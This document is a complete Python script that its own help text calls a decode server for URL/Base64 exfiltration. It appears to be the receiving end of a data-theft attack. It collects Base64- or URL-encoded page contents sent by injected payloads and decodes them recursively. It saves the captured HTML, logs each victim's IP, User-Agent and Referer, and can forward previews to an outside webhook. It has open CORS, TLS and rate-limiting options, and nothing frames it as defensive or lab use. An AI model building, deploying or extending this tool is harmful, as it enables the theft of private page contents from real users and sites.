#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import re
import sys
import os
import argparse
import threading
import json
import logging
import ssl
import requests
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional, Tuple, List, Dict, Any, Set
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict
from time import time
from abc import ABC, abstractmethod

class LayerType(Enum):
    URL = "url"
    BASE64 = "b64"

@dataclass
class Stats:
    total_requests: int = 0
    html_files_saved: int = 0
    unique_ips: Set[str] = field(default_factory=set)
    start_time: float = field(default_factory=time)
    
    def to_dict(self) -> Dict[str, Any]:
        uptime = time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "html_files_saved": self.html_files_saved,
            "unique_ips": len(self.unique_ips),
            "uptime_seconds": round(uptime, 2)
        }
    
    def add_request(self, ip: str, is_html: bool = False):
        self.total_requests += 1
        self.unique_ips.add(ip)
        if is_html:
            self.html_files_saved += 1

@dataclass
class Config:
    port: int = 80
    show_html: bool = False
    json_log: bool = False
    allowed_ips: Optional[Set[str]] = None
    max_depth: int = 5
    save_dir: str = 'decoded_html'
    # New features
    rate_limit_requests: int = 100
    rate_limit_window: int = 60
    webhook_url: Optional[str] = None
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    enable_stats_endpoint: bool = True

class Plugin(ABC):
    """Base class for processing plugins"""
    @abstractmethod
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        pass

class Base64Plugin(Plugin):
    """Enhanced Base64 processing plugin"""
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        # Could add custom Base64 variants here (URL-safe, etc.)
        return data

class URLDecodePlugin(Plugin):
    """Enhanced URL decoding plugin"""
    def process_data(self, data: str, metadata: Dict[str, Any]) -> str:
        # Could add double/triple URL decoding detection
        return data

class RateLimiter:
    """Simple rate limiter based on IP address"""
    def __init__(self, max_requests: int = 100, window: int = 60):
        self.max_requests = max_requests
        self.window = window
        self.requests = defaultdict(list)
        self.lock = threading.Lock()
    
    def is_allowed(self, ip: str) -> bool:
        with self.lock:
            now = time()
            # Clean old requests
            self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]
            
            if len(self.requests[ip]) >= self.max_requests:
                return False
            
            self.requests[ip].append(now)
            return True
    
    def get_remaining(self, ip: str) -> int:
        with self.lock:
            now = time()
            self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]
            return max(0, self.max_requests - len(self.requests[ip]))

class WebhookNotifier:
    """Send notifications via webhook"""
    def __init__(self, webhook_url: Optional[str] = None):
        self.webhook_url = webhook_url
        self.log = logging.getLogger(f"{__name__}.Webhook")
    
    def send_notification(self, event_type: str, data: Dict[str, Any]) -> None:
        if not self.webhook_url:
            return
        
        payload = {
            "event": event_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data
        }
        
        try:
            response = requests.post(self.webhook_url, json=payload, timeout=5)
            if response.status_code == 200:
                self.log.debug(f"Webhook sent successfully for {event_type}")
            else:
                self.log.warning(f"Webhook failed with status {response.status_code}")
        except requests.RequestException as e:
            self.log.warning(f"Webhook error: {e}")

class RecursiveDecoder:
    """Handles recursive URL and Base64 decoding with plugin support"""
    
    def __init__(self, max_depth: int = 5, plugins: Optional[List[Plugin]] = None):
        self.max_depth = max_depth
        self.plugins = plugins or []
        self.b64_pattern = re.compile(r'^[A-Za-z0-9+/]{8,}={0,2}$')
    
    @staticmethod
    def fix_b64_padding(b64_string: str) -> str:
        missing = len(b64_string) % 4
        return b64_string + '=' * (4 - missing) if missing else b64_string
    
    def try_base64_decode(self, s: str) -> Optional[str]:
        try:
            decoded = base64.b64decode(self.fix_b64_padding(s))
            return decoded.decode('utf-8', errors='replace')
        except Exception:
            return None
    
    def decode(self, data: str, metadata: Optional[Dict[str, Any]] = None) -> Tuple[str, List[Tuple[LayerType, str]]]:
        """Recursively decode data, returning final result and layer history"""
        metadata = metadata or {}
        layers = []
        current = data
        
        # Apply plugins first
        for plugin in self.plugins:
            try:
                current = plugin.process_data(current, metadata)
            except Exception as e:
                logging.warning(f"Plugin {plugin.__class__.__name__} failed: {e}")
        
        for _ in range(self.max_depth):
            # Try URL decoding first
            url_decoded = urllib.parse.unquote(current)
            if url_decoded != current:
                layers.append((LayerType.URL, url_decoded[:60]))
                current = url_decoded
                continue
            
            # Try Base64 decoding
            candidate = re.sub(r'\s+', '', current)
            if self.b64_pattern.match(candidate):
                b64_decoded = self.try_base64_decode(candidate)
                if b64_decoded:
                    layers.append((LayerType.BASE64, b64_decoded[:60]))
                    current = b64_decoded
                    continue
            break
        
        return current, layers

class FileManager:
    """Handles file operations with thread safety"""
    
    def __init__(self, save_dir: Path):
        self.save_dir = save_dir
        self.save_dir.mkdir(exist_ok=True)
        self.lock = threading.Lock()
        self.log = logging.getLogger(f"{__name__}.FileManager")
    
    def save_html(self, content: str, timestamp: str) -> Optional[Path]:
        filepath = self.save_dir / f'decoded_{timestamp}.html'
        return self._save_file(filepath, content, 'HTML')
    
    def save_raw(self, content: str, timestamp: str) -> Optional[Path]:
        filepath = self.save_dir / f'raw_{timestamp}.txt'
        return self._save_file(filepath, content, 'raw data')
    
    def _save_file(self, filepath: Path, content: str, file_type: str) -> Optional[Path]:
        try:
            with self.lock, filepath.open('w', encoding='utf-8') as f:
                f.write(content)
            self.log.info(f"[+] Saved {file_type}: {filepath}")
            return filepath
        except Exception as e:
            self.log.warning(f"[!] Error saving {file_type}: {e}")
            return None
    
    def append_json_log(self, entry: Dict[str, Any]) -> None:
        log_file = self.save_dir / 'log.jsonl'
        try:
            with self.lock, log_file.open('a', encoding='utf-8') as f:
                json.dump(entry, f, ensure_ascii=False)
                f.write('\n')
        except Exception as e:
            self.log.warning(f"Could not write to JSON log: {e}")

class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, config: Config, decoder: RecursiveDecoder, 
                 file_manager: FileManager, rate_limiter: RateLimiter,
                 webhook: WebhookNotifier, stats: Stats, **kwargs):
        self.config = config
        self.decoder = decoder
        self.file_manager = file_manager
        self.rate_limiter = rate_limiter
        self.webhook = webhook
        self.stats = stats
        self.log = logging.getLogger(f"{__name__}.Handler")
        super().__init__(*args, **kwargs)

    def log_message(self, fmt, *args):
        self.log.info("%s - [%s] %s", self.client_address[0], 
                     self.log_date_time_string(), fmt % args)

    def end_headers(self):
        cors_headers = {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type'
        }
        for header, value in cors_headers.items():
            self.send_header(header, value)
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def _check_permissions(self) -> bool:
        """Check IP allowlist and rate limiting"""
        client_ip = self.client_address[0]
        
        # Check IP allowlist
        if self.config.allowed_ips and client_ip not in self.config.allowed_ips:
            self.send_error(403, "IP not allowed")
            return False
        
        # Check rate limiting
        if not self.rate_limiter.is_allowed(client_ip):
            remaining = self.rate_limiter.get_remaining(client_ip)
            self.send_error(429, f"Rate limit exceeded. Try again later. Remaining: {remaining}")
            return False
        
        return True

    def _is_html_content(self, content: str) -> bool:
        content_lower = content.lower()
        return any(tag in content_lower for tag in ['<html', '<!doctype'])

    def _create_log_entry(self, timestamp: str, raw_data: str, 
                         layers: List[Tuple[LayerType, str]], final: str) -> Dict[str, Any]:
        return {
            "timestamp": timestamp,
            "ip": self.client_address[0],
            "headers": {
                "User-Agent": self.headers.get("User-Agent"),
                "Referer": self.headers.get("Referer")
            },
            "raw": raw_data[:120],
            "decoded_layers": [(layer.value, snippet) for layer, snippet in layers],
            "final_preview": final[:120]
        }

    def handle_stats_request(self):
        """Handle requests to /stats endpoint"""
        stats_data = self.stats.to_dict()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats_data, indent=2).encode())

    def handle_data(self, raw_data: str) -> None:
        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        client_ip = self.client_address[0]
        
        if '=' not in raw_data:
            self.log.warning(f"[!] Bad format: {raw_data}")
            return

        key, _, val = raw_data.partition('=')
        val = urllib.parse.unquote(val)
        
        self.log.info(f"[+] Raw ({key}): {val[:60]}{'...' if len(val) > 60 else ''}")
        
        # Decode the data with metadata
        metadata = {"client_ip": client_ip, "timestamp": timestamp}
        final, layers = self.decoder.decode(val, metadata)
        
        # Log decoding layers
        for i, (layer_type, snippet) in enumerate(layers, 1):
            self.log.info(f"    Layer {i} ({layer_type.value}): "
                         f"{snippet[:60]}{'...' if len(snippet) > 60 else ''}")
        
        self.log.info(f"[+] Final length: {len(final)} chars")
        self.log.info(f"    Final preview: {final[:20]!r}")

        # Create log entry
        entry = self._create_log_entry(timestamp, raw_data, layers, final)
        
        # Save raw data
        self.file_manager.save_raw(raw_data, timestamp)

        # Handle HTML content
        is_html = self._is_html_content(final)
        if is_html:
            saved_path = self.file_manager.save_html(final, timestamp)
            if saved_path:
                entry["saved_html"] = str(saved_path)
            
            if self.config.show_html:
                print("--- BEGIN DECODED HTML ---")
                print(final)
                print("--- END DECODED HTML ---")
            
            # Send webhook notification for HTML
            self.webhook.send_notification("html_decoded", {
                "ip": client_ip,
                "file_saved": str(saved_path) if saved_path else None,
                "preview": final[:100]
            })
        else:
            self.log.info("[!] Not HTML, skip saving.")
        
        # Update stats
        self.stats.add_request(client_ip, is_html)
        
        # Save JSON log if enabled
        if self.config.json_log:
            self.file_manager.append_json_log(entry)

    def do_POST(self):
        if not self._check_permissions():
            return
            
        self.log.info(f"🔍 POST {self.path}")
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        self.log.info(f"    Body: {body[:100]}{'...' if len(body) > 100 else ''}")
        
        self.handle_data(body)
        self._send_success_response()

    def do_GET(self):
        # Handle stats endpoint
        if self.config.enable_stats_endpoint and self.path == '/stats':
            return self.handle_stats_request()
        
        if not self._check_permissions():
            return
            
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        
        # Serve static files if they exist
        if filepath and Path(filepath).is_file():
            return super().do_GET()
        
        self.log.info(f"🔍 GET {self.path}")
        if parsed.query:
            self.handle_data(parsed.query)
        
        self._send_success_response()

    def do_HEAD(self):
        return self.do_GET()
    
    def _send_success_response(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

def create_handler_class(config: Config, decoder: RecursiveDecoder, 
                        file_manager: FileManager, rate_limiter: RateLimiter,
                        webhook: WebhookNotifier, stats: Stats):
    """Factory function to create handler class with dependencies"""
    class ConfiguredHandler(DecodeHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, config=config, decoder=decoder, 
                           file_manager=file_manager, rate_limiter=rate_limiter,
                           webhook=webhook, stats=stats, **kwargs)
    return ConfiguredHandler

def parse_args() -> Config:
    parser = argparse.ArgumentParser(description='Enhanced decode server for URL/Base64 exfiltration')
    parser.add_argument('--port', '-p', type=int, default=80, 
                       help='Port to listen on (default: 80)')
    parser.add_argument('--show', '-s', action='store_true', 
                       help='Print decoded HTML to console')
    parser.add_argument('--json-log', action='store_true', 
                       help='Enable JSON log output (to decoded_html/log.jsonl)')
    parser.add_argument('--allow-ip', nargs='*', 
                       help='List of allowed IP addresses')
    
    # New arguments
    parser.add_argument('--rate-limit', type=int, default=100,
                       help='Max requests per IP per window (default: 100)')
    parser.add_argument('--rate-window', type=int, default=60,
                       help='Rate limit window in seconds (default: 60)')
    parser.add_argument('--webhook-url', type=str,
                       help='Webhook URL for notifications')
    parser.add_argument('--ssl-cert', type=str,
                       help='SSL certificate file path')
    parser.add_argument('--ssl-key', type=str,
                       help='SSL private key file path')
    parser.add_argument('--no-stats', action='store_true',
                       help='Disable /stats endpoint')
    
    args = parser.parse_args()
    
    return Config(
        port=args.port,
        show_html=args.show,
        json_log=args.json_log,
        allowed_ips=set(args.allow_ip) if args.allow_ip else None,
        rate_limit_requests=args.rate_limit,
        rate_limit_window=args.rate_window,
        webhook_url=args.webhook_url,
        ssl_cert=args.ssl_cert,
        ssl_key=args.ssl_key,
        enable_stats_endpoint=not args.no_stats
    )

def setup_ssl(server: socketserver.TCPServer, cert_path: str, key_path: str):
    """Setup SSL for the server"""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    return server

def main():
    config = parse_args()
    
    # Setup logging
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
    log = logging.getLogger(__name__)
    
    # Initialize components
    base_dir = Path(__file__).parent.absolute()
    save_path = base_dir / config.save_dir
    
    # Initialize plugins
    plugins = [Base64Plugin(), URLDecodePlugin()]
    
    decoder = RecursiveDecoder(max_depth=config.max_depth, plugins=plugins)
    file_manager = FileManager(save_path)
    rate_limiter = RateLimiter(config.rate_limit_requests, config.rate_limit_window)
    webhook = WebhookNotifier(config.webhook_url)
    stats = Stats()
    
    print(f"Working dir: {base_dir}")
    print(f"Saving decoded HTML to: {save_path}")
    print(f"Listening on port: {config.port}, show mode: {config.show_html}, "
          f"json log: {config.json_log}")
    print(f"Rate limiting: {config.rate_limit_requests} req/{config.rate_limit_window}s per IP")
    if config.webhook_url:
        print(f"Webhook notifications: {config.webhook_url}")
    if config.enable_stats_endpoint:
        print(f"Stats endpoint: http://localhost:{config.port}/stats")
    
    # Create and start server
    handler_class = create_handler_class(config, decoder, file_manager, 
                                       rate_limiter, webhook, stats)
    
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    
    server = socketserver.ThreadingTCPServer(('0.0.0.0', config.port), handler_class)
    
    # Setup SSL if configured
    if config.ssl_cert and config.ssl_key:
        try:
            server = setup_ssl(server, config.ssl_cert, config.ssl_key)
            print(f"SSL enabled with cert: {config.ssl_cert}")
        except Exception as e:
            log.error(f"Failed to setup SSL: {e}")
            return
    
    try:
        print("🚀 Server is running! Press Ctrl+C to stop.")
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("KeyboardInterrupt received, shutting down server...")
    finally:
        server.shutdown()
        server.server_close()
        final_stats = stats.to_dict()
        log.info(f"Final stats: {final_stats}")
        log.info("Server has exited cleanly.")

if __name__ == '__main__':
    main()
